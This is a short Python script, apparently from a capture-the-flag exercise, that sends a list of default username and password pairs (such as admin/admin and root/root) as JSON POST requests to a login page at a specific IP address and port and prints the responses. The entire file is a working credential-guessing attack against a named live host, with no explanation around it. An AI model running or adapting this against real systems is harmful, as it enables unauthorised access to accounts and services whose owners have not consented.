import urllib.request, urllib.parse
from urllib.error import HTTPError

base = "http://116.202.106.156:5008/login"
cands = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("user","user"),("test","test"),("guest","guest"),
    ("ctf","ctf"),("root","root"),("administrator","administrator")
]
for u,p in cands:
    data = ("{\"username\":\"%s\",\"password\":\"%s\"}"%(u,p)).encode()
    req = urllib.request.Request(base, data=data, headers={"Content-Type":"application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode(errors="replace")
            print("OK",u,p,r.status,body)
    except HTTPError as e:
        body = e.read().decode(errors="replace")
        print("ERR",u,p,e.code,body)
